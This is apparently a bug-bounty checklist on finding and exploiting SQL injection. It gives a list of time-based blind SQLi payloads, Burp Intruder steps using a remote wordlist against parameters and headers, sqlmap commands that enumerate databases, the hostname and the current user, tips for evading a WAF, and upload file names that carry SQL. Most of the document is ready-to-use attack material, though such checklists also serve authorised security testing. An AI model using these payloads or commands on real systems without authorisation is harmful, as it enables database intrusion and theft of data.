## How to find SQL injectiosn vulnerability?

## 1) Logical Operation
One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results.
For example: if the GET parameter `?username=Peter` returns the same content as `?username=Peter'` or `?username=Peter+'1'='1` then, you found a SQL injection.

## 2) Time Based SQL Injection
Most relative place for inject SQL payloads as [POST Request] are in Login page (username parameter), Forget password page (username parameter), Singup Page (firstname and last name) 


Payloads:
```
orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
(SlEeP%09(14-(5-2)))
')) or sleep(5)=' 
' WAITFOR DELAY '0:0:5'-- 
;waitfor delay '0:0:5'-- 
);waitfor delay '0:0:5'-- 
';waitfor delay '0:0:5'-- 
";waitfor delay '0:0:5'-- 
');waitfor delay '0:0:5'-- 
");waitfor delay '0:0:5'-- 
));waitfor delay '0:0:5'-- 
0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z
0"XOR(if(now()=sysdate(),sleep(12),0))XOR"Z%20=%3E
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
```

![image](https://user-images.githubusercontent.com/63053441/155585150-722a2ec2-787d-42bd-85d7-30c6401f8031.png)

### How To Test?

 1) Use this [wordlist](https://raw.githubusercontent.com/0xmaximus/Galaxy-Bugbounty-Checklist/main/SQL%20injection/SQL.txt) with intruder and inject all payloads in relative parameters and headers(User-Agent, Cookies, Referer, x-requested-with and ...)  
 2) After you got DELAY, save request in txt file and use sqlmap for confirm and exploit vulnerability

```
sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user
sqlmap -r txt -p user --force-ssl --level 5 --risk 3
sqlmap -r request.txt -p email/username --force-ssl -level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
```

Sometimes you cant exploits because most modern web apps use WAF & user input validation before execute it so you can try with:
- change request form POST to GET or in reverse
- Use `--random-agent`


## 3) File Uploaders SQLi
Save file with this names and upload it in site
```
--sleep(15).png
--sleep(6*3).png
--sleep(25).png
--sleep(5*7).png
pic.png;waitfor delay '0:0:5'-- 
```


Refrence:

https://twitter.com/GodfatherOrwa
